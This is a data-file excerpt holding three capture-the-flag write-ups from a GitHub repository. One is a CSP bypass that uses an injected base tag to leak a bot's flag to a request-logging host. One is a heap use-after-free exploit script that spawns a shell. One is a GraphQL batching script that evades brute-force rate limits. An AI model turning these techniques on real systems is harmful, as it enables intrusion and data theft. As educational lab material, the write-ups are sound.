f\"\"\"<!doctype html>\r\n<html>\r\n<head>\r\n   <title>{title}</title>\r\n</head>\r\n<body>\r\n    <h1>{title}</h1>\r\n    <img src=\"/{path}.gif\"/>\r\n</body>\r\n</html>\"\"\"\r\n    )\r\n    response.headers[\"Content-Security-Policy\"] = \"img-src *; default-src 'none';\"\r\n    return response\r\n\r\n\r\n@app.route(\"/report\")\r\ndef report():\r\n    \"\"\"\r\n    This can be used to make bots surf this site.\r\n    Bots will have the flag cookie set accordingly.\r\n    \"\"\"\r\n    url = request.args.get(\"url\", default=\"\", type=str)\r\n    if not url:\r\n        return \"No url parameter provided to surf to\"\r\n    return requests.get(f\"http://surfer:8075?url={url}\").text\r\n\r\n\r\n@app.route(f\"/{flag}.gif\")\r\ndef show_gif():\r\n    return redirect(\"/static/flag.gif\")\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    app.run()\r\n\r\n```\r\n\r\n## Solution\r\n\r\nVisiting the website, we get the following output, as expected:\r\n\r\n```html\r\n<!doctype html>\r\n<html>\r\n<head>\r\n   <title>Flags for Friendly Fellows</title>\r\n</head>\r\n<body>\r\n    <h1>Flags for Friendly Fellows</h1>\r\n    <img src=\"/static/flag.gif\"/>\r\n</body>\r\n</html>\r\n```\r\n\r\nThe `title` field is clearly vulnerable to injection, but scripts won't execute due to the existence of the CSP (Content-Security-Policy) header.\r\n\r\nThe solution is to inject an HTML tag instead: `<base href=\"\" />`. This tag instructs the browser to load all relative resources from a given base address instead of assuming addresses are relative to the current page's URI.\r\n\r\nLet's try visiting `http://45.76.92.221:8070/?title=%3Cbase%20href=%22https://www.google.com%22%20/%3E`:\r\n\r\n```html\r\n<!doctype html>\r\n<html>\r\n<head>\r\n   <title><base href=\"https://www.google.com\" /></title>\r\n</head>\r\n<body>\r\n    <h1><base href=\"https://www.google.com\" /></h1>\r\n    <img src=\"/static/flag.gif\"/>\r\n</body>\r\n</html>\r\n```\r\n\r\nIn this case, the browser attempts to load `/static/flag.gif` from `https://www.google.com` (this obviously fails).\r\n\r\nBut what if we replace `https://www.google.com` with a server that logs all requests, such as [requestbin.com](https://requestbin.com)? \r\n\r\n\r\n```html\r\n<!doctype html>\r\n<html>\r\n<head>\r\n   <title><base href=\"https://enskhpoprq3jl.x.pipedream.net\" /></title>\r\n</head>\r\n<body>\r\n    <h1><base href=\"https://enskhpoprq3jl.x.pipedream.net\" /></h1>\r\n    <img src=\"/static/flag.gif\"/>\r\n</body>\r\n</html>\r\n```\r\n\r\nAny access to this page will attempt to load the resource from `https://enskhpoprq3jl.x.pipedream.net`, which will be logged and visible by us. If we visit the page, `/static/flag.gif` will be loaded. But according to the challenge comments, we can trigger a bot to visit any link using the `/report` API, and the bot will have the cookie value which will load the real flag as the image path.\r\n\r\nTo conclude, we need to access:\r\n```\r\nhttp://45.76.92.221:8070/report?url=http://45.76.92.221:8070/?title=%3Cbase%20href=%22https://enskhpoprq3jl.x.pipedream.net%22%20/%3E\r\n```\r\n\r\nThe bot visits:\r\n```\r\nhttp://45.76.92.221:8070/?title=%3Cbase%20href=%22https://enskhpoprq3jl.x.pipedream.net%22%20/%3E\r\n```\r\n\r\nThe visit gets logged:\r\n```\r\nGET /junior-CSP_THE_C_IS_FOR_CYBER.gif\r\nhost: enskhpoprq3jl.x.pipedream.net\r\nAccept: image/webp,image/apng,image/*,*/*;q=0.8\r\nAccept-Encoding: gzip, deflate, br\r\nCache-Control: no-cache\r\nPragma: no-cache\r\nReferer: http://45.76.92.221:8070/?title=%3Cbase%20href=%22https://enskhpoprq3jl.x.pipedream.net%22%20/%3E\r\nSec-Fetch-Mode: no-cors\r\nSec-Fetch-Site: cross-site\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.0 Safari/537.36\r\nConnection: keep-alive\r\n```\r\n\r\nThe flag is: `junior-CSP_THE_C_IS_FOR_CYBER`", "timestamp": "2025-10-21T13:36:18.077812"}
{"source": "github", "repo": "Dvd848/CTFs", "file": "2019_36C3_Junior/minifd.md", "url": "https://github.com/Dvd848/CTFs/blob/master/2019_36C3_Junior/minifd.md", "content": "# minifd \r\nPwn, Medium\r\n\r\n## Description\r\n\r\n> This is a simple file manager implementation supporting basic functionality to create, read, and write files. Please note: This is a prototype implementation. At this point of time, only 16 files can be managed at the same time.\r\n\r\nA binary file was attached.\r\n\r\n## Solution\r\n\r\nLet's inspect the binary file:\r\n\r\n```console\r\nroot@kali:/media/sf_CTFs/36c3/minifd# file fd\r\nfd: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=45aec24480e82735f7358d9263d10cafd4eda8f8, not stripped\r\nroot@kali:/media/sf_CTFs/36c3/minifd# checksec.sh -f fd\r\nRELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE\r\nPartial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   85 Symbols      Yes     2               4            fd\r\n```\r\n\r\nLet's run it:\r\n```console\r\nroot@kali:/media/sf_CTFs/36c3/minifd# ./fd\r\n\r\n----------------------\r\n Simple File Mananger\r\n----------------------\r\n\r\nThis is a simple file manager implementation supporting basic functionality\r\nto create, read, and write files.\r\n\r\nPlease note:\r\nThis is a prototype implementation.\r\nAt this point of time, only 16 files can be managed at the same time.\r\n\r\nThe Simple File Manager supports the following operations.\r\n[1] list\r\n    Print the file table\r\n[2] create <string>\r\n    Create a file with name <string>\r\n[3] close <fd>\r\n    Close the file with file descriptor <fd>\r\n[4] dup <fd>\r\n    Duplicate a file descriptor <fd>\r\n[5] read <fd> <n>\r\n    Read <n> bytes from the file with file descriptor <fd>\r\n[6] write <fd> <n> <string>\r\n    Write <n> bytes to the file with file descriptor <fd>\r\n[7] exit\r\n    Leave the Simple File Manager\r\n\r\n\r\nEnter the command you want to execute.\r\n[1] list\r\n[2] create <string>\r\n[3] close <fd>\r\n[4] dup <fd>\r\n[5] read <fd> <n>\r\n[6] write <fd> <n> <string>\r\n[7] exit\r\n\r\n>\r\n```\r\n\r\nWe have here a simple file manager. Using Ghidra, we can inspect the implementation under the hood. We find that the file manager uses an array of 16 entries (\"`files`\") to hold information about the files in the file system. Each entry holds a pointer to a file context allocated on the heap.\r\n\r\nUsing Ghidra's Structure Editor, we can reconstruct the file context structure based on the usage across the program, and redefine the type of the relevant pointers throughout the program to this reconstructed type. \r\n\r\nThe file context structure and global file array are translated to:\r\n```c\r\ntypedef struct file_context \r\n{\r\n    uint8_t     reference_count;\r\n    uint8_t     reserved[3];\r\n    uint32_t    data_length;\r\n    uint8_t*    p_data;\r\n    char        name[32];\r\n    void*       p_close_func;\r\n    void*       p_read_func;\r\n    void*       p_write_func;\r\n    void*       p_dup_func;\r\n} file_context_t;\r\n\r\nfile_context_t* files[16];\r\n```\r\n\r\nLet's inspect the decompilation output of some important functions.\r\n\r\nThe function we want to call is:\r\n```c\r\nvoid spawn_shell(void)\r\n{\r\n  long in_FS_OFFSET;\r\n  char *local_28;\r\n  undefined8 local_20;\r\n  long local_10;\r\n  \r\n  local_10 = *(long *)(in_FS_OFFSET + 0x28);\r\n  local_28 = \"/bin/bash\";\r\n  local_20 = 0;\r\n  execve(\"/bin/bash\",&local_28,(char **)0x0);\r\n  if (local_10 == *(long *)(in_FS_OFFSET + 0x28)) {\r\n    return;\r\n  }\r\n                    // WARNING: Subroutine does not return\r\n  __stack_chk_fail();\r\n}\r\n```\r\n\r\nObviously, it isn't called via the normal program flow. Now, let's take a look at the function that is responsible for file creation:\r\n\r\n```c\r\nulong create(char *file_name)\r\n{\r\n  ulong i;\r\n  file_context_t *local_RAX_77;\r\n  ulong uVar1;\r\n  \r\n  if (files[0] == (file_context_t *)0x0) {\r\n    uVar1 = 0;\r\nLAB_00400a71:\r\n    local_RAX_77 = (file_context_t *)calloc(1,80);\r\n    local_RAX_77->reference_count = '\\x01';\r\n    local_RAX_77->data_length = 0;\r\n    local_RAX_77->p_data = (char *)0x0;\r\n    strncpy(local_RAX_77->name,file_name,31);\r\n    *(code **)&local_RAX_77->p_close_func = c3ctf_file_close;\r\n    *(code **)&local_RAX_77->p_read_func = c3ctf_file_read;\r\n    *(code **)&local_RAX_77->p_write_func = c3ctf_file_write;\r\n    *(code **)&local_RAX_77->p_dup_func = c3ctf_file_dup;\r\n    files[(int)uVar1] = local_RAX_77;\r\n  }\r\n  else {\r\n    i = 1;\r\n    do {\r\n      uVar1 = i & 0xffffffff;\r\n      if (files[i] == (file_context_t *)0x0) {\r\n        if ((int)i < 0) {\r\n          return 0xffffffff;\r\n        }\r\n        goto LAB_00400a71;\r\n      }\r\n      i = i + 1;\r\n    } while (i != 0x10);\r\n    uVar1 = 0xffffffff;\r\n  }\r\n  return uVar1;\r\n}\r\n```\r\n\r\nAssuming there's a free slot in the array, the `create` command handler allocates 80 bytes for the context and saves the pointer. The context is populated with a reference count of 1, some function pointers and a bit more metadata. The function pointers are called from within other command handlers.\r\n\r\nWriting a file:\r\n```c\r\nundefined8 do_write(int file_fd,uint new_data_length,char *p_new_data)\r\n{\r\n  file_context_t *pfVar1;\r\n  \r\n  pfVar1 = files[file_fd];\r\n  if (pfVar1 != (file_context_t *)0x0) {\r\n    (*(code *)pfVar1->p_write_func)(pfVar1,new_data_length,p_new_data);\r\n    return 0;\r\n  }\r\n  return 0xffffffff;\r\n}\r\n\r\nvoid c3ctf_file_write(file_context_t *p_ctx,uint new_data_length,char *p_new_data)\r\n{\r\n  char *pcVar1;\r\n  \r\n  if (p_ctx->data_length < new_data_length) {\r\n    pcVar1 = (char *)realloc(p_ctx->p_data,(ulong)new_data_length);\r\n    p_ctx->p_data = pcVar1;\r\n  }\r\n  p_ctx->data_length = new_data_length;\r\n  strncpy(p_ctx->p_data,p_new_data,(ulong)new_data_length);\r\n  return;\r\n}\r\n```\r\n\r\nReading a file:\r\n```c\r\nundefined8 do_read(int file_fd,uint length_to_read,char *p_out_buffer)\r\n{\r\n  file_context_t *pfVar1;\r\n  \r\n  pfVar1 = files[file_fd];\r\n  if (pfVar1 != (file_context_t *)0x0) {\r\n    (*(code *)pfVar1->p_read_func)(pfVar1,length_to_read,p_out_buffer);\r\n    return 0;\r\n  }\r\n  return 0xffffffff;\r\n}\r\n\r\nvoid c3ctf_file_read(file_context_t *p_ctx,uint length_to_read,char *p_out_buffer)\r\n{\r\n  if (p_ctx->data_length < length_to_read || p_ctx->data_length == length_to_read) {\r\n    length_to_read = p_ctx->data_length;\r\n  }\r\n  strncpy(p_out_buffer,p_ctx->p_data,(ulong)length_to_read);\r\n  return;\r\n}\r\n```\r\n\r\nDuplicating a file:\r\n```c\r\nulong do_dup(int file_fd)\r\n{\r\n  file_context_t *pfVar1;\r\n  ulong uVar2;\r\n  ulong uVar3;\r\n  \r\n  pfVar1 = files[file_fd];\r\n  if (pfVar1 == (file_context_t *)0x0) {\r\n    uVar2 = 0xffffffff;\r\n  }\r\n  else {\r\n    (*(code *)pfVar1->p_dup_func)(pfVar1);\r\n    if (files[0] == (file_context_t *)0x0) {\r\n      uVar2 = 0;\r\nLAB_00400a0c:\r\n      files[(int)uVar2] = pfVar1;\r\n    }\r\n    else {\r\n      uVar3 = 1;\r\n      do {\r\n        uVar2 = uVar3 & 0xffffffff;\r\n        if (files[uVar3] == (file_context_t *)0x0) {\r\n          if ((int)uVar3 < 0) {\r\n            return 0xffffffff;\r\n          }\r\n          goto LAB_00400a0c;\r\n        }\r\n        uVar3 = uVar3 + 1;\r\n      } while (uVar3 != 0x10);\r\n      uVar2 = 0xffffffff;\r\n    }\r\n  }\r\n  return uVar2;\r\n}\r\n\r\nvoid c3ctf_file_dup(file_context_t *p_ctx)\r\n{\r\n  p_ctx->reference_count = p_ctx->reference_count + '\\x01';\r\n  return;\r\n}\r\n```\r\n\r\nClosing a file:\r\n```c\r\nundefined8 do_close(int file_fd)\r\n{\r\n  file_context_t *pfVar1;\r\n  \r\n  pfVar1 = files[file_fd];\r\n  if (pfVar1 != (file_context_t *)0x0) {\r\n    (*(code *)pfVar1->p_close_func)(pfVar1);\r\n    files[file_fd] = (file_context_t *)0x0;\r\n    return 0;\r\n  }\r\n  return 0xffffffff;\r\n}\r\n\r\nvoid c3ctf_file_close(file_context_t *p_ctx)\r\n{\r\n  uint8_t uVar1;\r\n  \r\n  uVar1 = p_ctx->reference_count + -1;\r\n  p_ctx->reference_count = uVar1;\r\n  if (uVar1 != '\\0') {\r\n    return;\r\n  }\r\n  free(p_ctx->p_data);\r\n  free(p_ctx);\r\n  return;\r\n}\r\n```\r\n\r\nWe can see two bugs in the implementation above. For the first bug, let's take a look at how the handlers are called from the program loop above:\r\n```c\r\niVar1 = __isoc99_sscanf(user_input,\"close %d\",&file_fd);\r\nif (iVar1 == 1) {\r\n  uVar3 = do_close(file_fd);\r\n  if ((int)uVar3 == 0) {\r\n    __printf_chk(1,\"Closed file with file descriptor: %d\\n\",(ulong)file_fd);\r\n  }\r\n  else {\r\n    __printf_chk(1,\"Error: File with fd %d could not be closed\\n\",(ulong)file_fd);\r\n  }\r\n}\r\n```\r\n\r\nThis is an example for `close`, but other functions behave in the same way. As you can see, the `fd` is received from the user and passed on to the handler without validating bounds. It is then used in order to access the `files` array. This means that the user can input any integer (positive or negative) and cause the program to treat an arbitrary 8-byte aligned address as a pointer to a file context. However, I couldn't find a way to exploit this in the given program.\r\n\r\nThe other bug is much easier to exploit. Let's take another look at the duplication handler. We'll refactor it a bit and inline `c3ctf_file_dup` for the sake of readability:\r\n```c\r\npfVar1 = files[file_fd];\r\nif (pfVar1 == NULL)\r\n{\r\n  return -1;\r\n}\r\n\r\npfVar1->reference_count += 1;\r\nfor (i = 0; i < 16; i++)\r\n{\r\n  if (files[i] == NULL)\r\n  {\r\n    files[i] = pfVar1;\r\n    return i;\r\n  }\r\n}\r\n\r\nreturn -1;\r\n```\r\n\r\n`dup` causes an additional entry in the array to point to the same context. The number of files using the same context is maintained in the reference counter field of the context. This field is used to ensure that `close` will only free the context once no more files are using it. However, we can see that the reference counter is advanced before the function makes sure that there is room in the array for the new file. This means that after filling up the file array, we can call `dup` as much as we want in order to control the reference counter of any file.\r\n\r\nTherefore, the plan is to:\r\n1. Create a file (\"file_0\")\r\n2. Duplicate the file so that both files use the same context on the heap (\"file0_dup\")\r\n3. Create a third file which will be used in a moment (\"file_1\")\r\n4. Fill up the table with filler files\r\n5. Use the bug to overflow the reference counter of \"file_0\" (and its duplicate file) to 1\r\n6. Free \"file_0\". Since the reference counter will be decremented to 0, the file context will be freed. However we still have access to it via \"file0_dup\".\r\n7. Perform a write to \"file1\" with a specially crafted input:\r\n   1. Note that `write` allocates a buffer from the heap to hold the input\r\n   2. If the buffer size needed to hold the input is the same size as the buffer just freed (the one that held the file context for \"file_0\"), there's a good chance that the heap manager will reuse it, allowing us to effectively write to the buffer that \"file0_dup\" is pointing to\r\n   3. We'll craft the input as a file_context_t structure. The important part is to place the address of `spawn_shell` in an offset which is reserved for a file pointer\r\n8. Trigger an action which will invoke the function pointer we've placed, via `file0_dup`\r\n9. Get a shell\r\n\r\nThe following script performs this:\r\n```python\r\n#First, generate a template with \"pwn template fd\"\r\n#===========================================================\r\n#                    EXPLOIT GOES HERE\r\n#===========================================================\r\n# Arch:     amd64-64-little\r\n# RELRO:    Partial RELRO\r\n# Stack:    Canary found\r\n# NX:       NX enabled\r\n# PIE:      No PIE (0x400000)\r\n# FORTIFY:  Enabled\r\n\r\nimport re, ctypes\r\n\r\nclass file_context_t(ctypes.Structure):\r\n    _fields_ = [    \r\n                    (\"reference_count\",     ctypes.c_ubyte),\r\n                    (\"reserved\" ,           ctypes.c_ubyte * 3),\r\n                    (\"data_length\",         ctypes.c_uint32),\r\n                    (\"data\",                ctypes.c_char_p),\r\n                    (\"name\" ,               ctypes.c_ubyte * 32),\r\n                    (\"p_close_func\" ,       ctypes.c_uint64), # void*\r\n                    (\"p_read_func\" ,        ctypes.c_uint64), # void*\r\n                    (\"p_write_func\" ,       ctypes.c_uint64), # void*\r\n                    (\"p_dup_func\" ,         ctypes.c_uint64) # void*\r\n    ]\r\n\r\n    def to_bytes(self):\r\n        return buffer(self)[:]\r\n\r\nUINT8_MAX = 0xFF\r\n\r\nENTER_CMD = \"\\nEnter the command you want to execute.\"\r\n\r\ndef read_opening_text(proc):\r\n    return proc.recvuntil(ENTER_CMD, drop = True) \r\n\r\ndef read_menu(proc):\r\n    proc.recvuntil(\"\\n> \")\r\n\r\ndef print_list(proc):\r\n    read_menu(proc)\r\n    proc.sendline(\"list\")\r\n    return proc.recvuntil(ENTER_CMD, drop = True)\r\n\r\ndef create(proc, name):\r\n    read_menu(proc)\r\n    proc.sendline(\"create {}\".format(name))\r\n    resp = proc.recvline()\r\n    if \"Error\" in resp:\r\n        raise Exception(resp)\r\n    new_fd = resp.split(\": \")[1].rstrip()\r\n    log.info(\"File '{}' created with fd {}\".format(name, new_fd))\r\n    return new_fd\r\n\r\ndef close(proc, fd):\r\n    read_menu(proc)\r\n    proc.sendline(\"close {}\".format(fd))\r\n    log.info(\"Closing file with fd {}\".format(fd))\r\n\r\ndef dup(proc, fd):\r\n    read_menu(proc)\r\n    proc.sendline(\"dup {}\".format(fd))\r\n    resp = proc.recvline()\r\n    if \"Error\" in resp:\r\n        raise Exception(resp)\r\n    new_fd = resp.split(\": \")[1].rstrip()\r\n    log.info(\"File with fd {} duplicated, new fd: {}\".format(fd, new_fd))\r\n    return new_fd\r\n\r\ndef read(proc, fd, n):\r\n    read_menu(proc)\r\n    proc.sendline(\"read {} {}\".format(fd, n))\r\n    log.info(\"Reading {} bytes from fd {}\".format(n, fd))\r\n    resp = proc.recvline()\r\n    return proc.recvuntil(ENTER_CMD, drop = True) \r\n\r\ndef write(proc, fd, n, data):\r\n    read_menu(proc)\r\n    proc.sendline(\"write {} {} {}\".format(fd, n, data))\r\n    log.info(\"Writing {} bytes to fd {}:\\n{}\".format(n, fd, hexdump(data)))\r\n    resp = proc.recvline()\r\n    return proc.recvuntil(ENTER_CMD, drop = True) \r\n\r\ndef exit(proc):\r\n    read_menu(proc)\r\n    proc.sendline(\"exit\")\r\n    log.info(\"Quitting...\")\r\n\r\nlog.info(\"Address of spawn_shell(): {}\".format(hex(exe.symbols['spawn_shell'])))\r\n\r\nio = start()\r\n\r\nopening_text = read_opening_text(io)\r\nmatch = re.search(r\"At this point of time, only (\\d+) files can be managed at the same time.\", opening_text)\r\nnum_files = int(match.group(1))\r\n\r\nfile0 = create(io, \"file_0\")\r\nfile1 = create(io, \"file_1\")\r\nfile0_dup = dup(io, file0)\r\n\r\nfor i in range(num_files - len([file0, file0_dup, file1])):\r\n    create(io, \"filler_{}\".format(i))\r\n\r\n\r\n# Overflow reference counter for file_0 (current reference count is 2)\r\nnum_duplications = UINT8_MAX\r\nfor i in range(num_duplications):\r\n    try:\r\n        dup(io, file0)\r\n    except:\r\n        pass\r\nlog.info(\"Attempted to duplicate fd {} for {} times\".format(file0, num_duplications))\r\n# Reference counter is now 1\r\n\r\nclose(io, file0)\r\n\r\nfc = file_context_t.from_buffer_copy('A' * ctypes.sizeof(file_context_t))\r\nfc.p_close_func = exe.symbols['spawn_shell']\r\n\r\nwrite(io, file1, ctypes.sizeof(fc), fc.to_bytes())\r\n\r\nclose(io, file0_dup)\r\n\r\nio.interactive()\r\n```\r\n\r\nOutput:\r\n```console\r\nroot@kali:/media/sf_CTFs/36c3/minifd# python exploit.py\r\n[*] '/media/sf_CTFs/36c3/minifd/fd'\r\n    Arch:     amd64-64-little\r\n    RELRO:    Partial RELRO\r\n    Stack:    Canary found\r\n    NX:       NX enabled\r\n    PIE:      No PIE (0x400000)\r\n    FORTIFY:  Enabled\r\n[*] Address of spawn_shell(): 0x400e9e\r\n[+] Starting local process '/media/sf_CTFs/36c3/minifd/fd': pid 1739\r\n[*] File 'file_0' created with fd 0\r\n[*] File 'file_1' created with fd 1\r\n[*] File with fd 0 duplicated, new fd: 2\r\n[*] File 'filler_0' created with fd 3\r\n[*] File 'filler_1' created with fd 4\r\n[*] File 'filler_2' created with fd 5\r\n[*] File 'filler_3' created with fd 6\r\n[*] File 'filler_4' created with fd 7\r\n[*] File 'filler_5' created with fd 8\r\n[*] File 'filler_6' created with fd 9\r\n[*] File 'filler_7' created with fd 10\r\n[*] File 'filler_8' created with fd 11\r\n[*] File 'filler_9' created with fd 12\r\n[*] File 'filler_10' created with fd 13\r\n[*] File 'filler_11' created with fd 14\r\n[*] File 'filler_12' created with fd 15\r\n[*] Attempted to duplicate fd 0 for 255 times\r\n[*] Closing file with fd 0\r\n[*] Writing 80 bytes to fd 1:\r\n    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│\r\n    *\r\n    00000030  9e 0e 40 00  00 00 00 00  41 41 41 41  41 41 41 41  │··@·│····│AAAA│AAAA│\r\n    00000040  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│\r\n    00000050\r\n[*] Closing file with fd 2\r\n[*] Switching to interactive mode\r\n$ cat flag.txt\r\njunior-pwned_after_the_ctf_was_over\r\n$ exit\r\n[*] Got EOF while reading in interactive\r\n$\r\n[*] Process '/media/sf_CTFs/36c3/minifd/fd' stopped with exit code 0 (pid 1739)\r\n[*] Got EOF while sending in interactive\r\n```\r\n\r\nBonus: While debugging the exploit with GDB, it's very convenient to use be able to view the file context as a logical structure. However, the structure definition was stripped from the binary. The solution (obtained from [here](https://stackoverflow.com/questions/7272558/can-we-define-a-new-data-type-in-a-gdb-session/7273785#7273785)) is to compile a fake `C` file and take the symbols from there:\r\n```console\r\nroot@kali:/media/sf_CTFs/36c3/minifd# cat src.c\r\n\r\n#import <stdint.h>\r\n\r\ntypedef struct file_context {\r\n    uint8_t     reference_count;\r\n    uint8_t     reserved[3];\r\n    uint32_t    data_length;\r\n    uint8_t*    p_data;\r\n    char        name[32];\r\n    void*       p_close_func;\r\n    void*       p_read_func;\r\n    void*       p_write_func;\r\n    void*       p_dup_func;\r\n} file_context_t;\r\n\r\nfile_context_t dummy;\r\nroot@kali:/media/sf_CTFs/36c3/minifd# gcc -g -c src.c\r\nroot@kali:/media/sf_CTFs/36c3/minifd#\r\n```\r\n\r\nThen:\r\n\r\n```\r\ngdb-peda$ add-symbol-file src.o 0\r\nadd symbol table from file \"src.o\" at\r\n\t.text_addr = 0x0\r\nReading symbols from src.o...done.\r\ngdb-peda$ p *((file_context_t*[16])files)[2]\r\n$3 = {\r\n  reference_count = 0x1, \r\n  reserved = \"\\000\\000\", \r\n  data_length = 0x0, \r\n  p_data = 0x0, \r\n  name = \"file_0\", '\\000' <repeats 25 times>, \r\n  p_close_func = 0x4008ab <c3ctf_file_close>, \r\n  p_read_func = 0x4008d0 <c3ctf_file_read>, \r\n  p_write_func = 0x4008f1 <c3ctf_file_write>, \r\n  p_dup_func = 0x4008a7 <c3ctf_file_dup>\r\n}\r\n```", "timestamp": "2025-10-21T13:36:18.182100"}
{"source": "github", "repo": "Dvd848/CTFs", "file": "2019_36C3_Junior/querying.md", "url": "https://github.com/Dvd848/CTFs/blob/master/2019_36C3_Junior/querying.md", "content": "# querying\r\nWeb, Medium\r\n\r\n## Description\r\n\r\n> In German, Graf means count. Anyway I'm certain he likes pie. Who doesn't? He also won't give you the Flag as he keeps track of every request. Nothing to see here, please move along. http://199.247.4.207:4000/\r\n\r\nA tar file was attached.\r\n\r\n## Solution\r\n\r\nLet's inspect the tar file:\r\n\r\n```console\r\nroot@kali:/media/sf_CTFs/36c3/querying# tree dist.tar/\r\ndist.tar/\r\n├── dist\r\n│   ├── docker-compose.yml\r\n│   ├── Dockerfile\r\n│   ├── package.json\r\n│   ├── package-lock.json\r\n│   ├── prisma\r\n│   │   ├── datamodel.prisma\r\n│   │   ├── prisma.yml\r\n│   │   └── seed.graphql\r\n│   ├── src\r\n│   │   ├── generated\r\n│   │   │   └── prisma-client\r\n│   │   │       ├── index.d.ts\r\n│   │   │       ├── index.js\r\n│   │   │       └── prisma-schema.js\r\n│   │   ├── index.js\r\n│   │   └── schema.graphql\r\n│   └── yarn.lock\r\n└── dist.tar\r\n```\r\n\r\nThis archive contains the backend of a service. The interesting part of the backend is `index.js`:\r\n\r\n```javascript\r\nconst { GraphQLServer } = require('graphql-yoga')\r\nconst LRU = require('lru-cache')\r\n\r\nconst { prisma } = require('./generated/prisma-client')\r\n\r\nconst MAX_WAIT = 10 * 1000 // 10 seconds\r\n\r\nconst FLAG = \"junior-THIS_IS_A_DUMMY\"\r\nconst FLAG_REGEX = /$junior-[a-zA-Z0-9_]24^/.compile()\r\n\r\nconst requestsPerClient = new LRU({\r\n  max: 16 * 1024,\r\n  maxAge: 1000 * 60\r\n})\r\n\r\nfunction bruteforceProtection(context) {\r\n  const ip = context.request.ip\r\n  if (context.request.headers[\"admin\"]) {\r\n    console.log(\"ip\", ip)\r\n    let requests = requestsPerClient.get(ip) || 0\r\n    const waitTime = 15 * requests * 1000\r\n    requestsPerClient.set(ip, requests + 1)\r\n    return new Promise(\r\n      resolve => setTimeout(\r\n        () => (console.log(\"finished\", ip, waitTime) || resolve()), waitTime\r\n      )\r\n    )\r\n  }\r\n  return Promise.resolve()\r\n}\r\n\r\nconst resolvers = {\r\n  Query: {\r\n    feed: (parent, args, context) => {\r\n      return context.prisma.posts({ where: { published: true } })\r\n    },\r\n    drafts: (parent, args, context) => {\r\n      return context.prisma.posts({ where: { published: false } })\r\n    },\r\n    post: (parent, { id }, context) => {\r\n      return context.prisma.post({ id })\r\n    },\r\n  },\r\n  Mutation: {\r\n    checkFlag(parent, {flag}, context) {\r\n      if (!context.request.headers[\"admin\"]) throw \"Preheat oven!\"\r\n      if (FLAG_REGEX.exec(flag) && flag === FLAG) return FLAG.length\r\n      let i = 0\r\n      while (flag[i] === FLAG[i]) i++\r\n      return i\r\n    },\r\n    createDraft(parent, { title, content }, context) {\r\n      return context.prisma.createPost({\r\n        title,\r\n        content,\r\n      })\r\n    },\r\n    deletePost(parent, { id }, context) {\r\n      return context.prisma.deletePost({ id })\r\n    },\r\n    publish(parent, { id }, context) {\r\n      return context.prisma.updatePost({\r\n        where: { id },\r\n        data: { published: true },\r\n      })\r\n    },\r\n  },\r\n}\r\n\r\nconst server = new GraphQLServer({\r\n  typeDefs: './src/schema.graphql',\r\n  resolvers,\r\n  context: async (request, response, fragmentReplacements) => ({\r\n    ...request,\r\n    prisma,\r\n    console: await bruteforceProtection(request)\r\n  }),\r\n})\r\n\r\nserver.start(() => console.log('Server is running on http://localhost:4000'))\r\n```\r\n\r\nThis looks like a `GraphQL` service:\r\n\r\n> GraphQL is an open-source data query and manipulation language for APIs, and a runtime for fulfilling queries with existing data. \r\n\r\nThe website at `http://199.247.4.207:4000/` offered an online IDE allowing to perform queries to the backend. \r\n\r\nLet's take a look at `checkFlag`:\r\n\r\n```javascript\r\ncheckFlag(parent, {flag}, context) {\r\n    if (!context.request.headers[\"admin\"]) throw \"Preheat oven!\"\r\n    if (FLAG_REGEX.exec(flag) && flag === FLAG) return FLAG.length\r\n    let i = 0\r\n    while (flag[i] === FLAG[i]) i++\r\n    return i\r\n}\r\n```\r\n\r\nThis function actually tells us, given a flag string that we provide, how many consecutive characters we got right. The catch is that it's protected by a `bruteforceProtection` which limits the number of queries that we can perform in a given period. \r\n\r\nA single request to the server would look like:\r\n\r\n```javascript\r\nmutation { \r\n    checkFlag(flag: \"junior-A\")\r\n}\r\n```\r\n\r\nIf we will receive a response of `7` from the server, we know that only the `junior-` prefix matches the flag, and we should continue to the next attempt:\r\n\r\n```javascript\r\nmutation { \r\n    checkFlag(flag: \"junior-B\")\r\n}\r\n```\r\n\r\nOnce we recive an `8`, we know that we found the correct character and move on to the next index in the flag. According to the `FLAG_REGEX`, we have 24 characters apart from the prefix. We also know that the flag only consists of uppercase and lowercase letters, digits and the underscore character. Even so, if we have to wait between every request it would take quite a while to get the full flag.\r\n\r\nThe brute force protection is coupled with the requesters IP, so one naive way of bypassing it would be to use many proxies. However, there's a better way: Batch requests.\r\n\r\nInstead of the syntax above, we can use the following syntax:\r\n\r\n```javascript\r\nmutation {\r\n  name1: checkFlag(flag: \"junior-A\"),\r\n  name2: checkFlag(flag: \"junior-B\"),\r\n}\r\n```\r\n\r\nThis sends two simultaneous requests which count as one for the brute force protection. We can generalize this and send all possible options in a single request.\r\n\r\n```python\r\nimport requests, json, string\r\nimport operator\r\n\r\ndef send_query(flag):\r\n    alphabet = string.ascii_letters + string.digits + '_'\r\n    prefix = \"flag_\"\r\n\r\n    mutation = \"mutation {\"\r\n    for c in alphabet:\r\n        mutation += \"{}: checkFlag(flag: \\\"{}\\\"),\".format(prefix + c, flag + c)\r\n    mutation += \"}\"\r\n\r\n    json_data = {\r\n        \"operationName\": None,\r\n        \"variables\": {},\r\n        \"query\": mutation\r\n    }\r\n    r = requests.post(\"http://199.247.4.207:4000/\", json=json_data, headers={\"admin\": \"1\"})\r\n    data = r.json()[\"data\"]\r\n    c = max(data.items(), key=operator.itemgetter(1))[0]\r\n    return c.replace(prefix, \"\")\r\n\r\nflag = \"\"\r\n\r\nwhile len(flag) < 31:\r\n    c = send_query(flag, proxy)\r\n    print (c, end='', flush=True)\r\n    flag += c\r\n        \r\nprint(\"\")\r\nprint(flag)\r\n```\r\n\r\nWe still need to wait a bit between requests, but the flag returns within a reasonable time. Combined with a list of (good) proxies, the flag would return almost immediately.\r\n\r\nThe flag: `junior-Batching_Qu3r1e5_is_FUN1`", "timestamp": "2025-10-21T13:36:18.294562"}
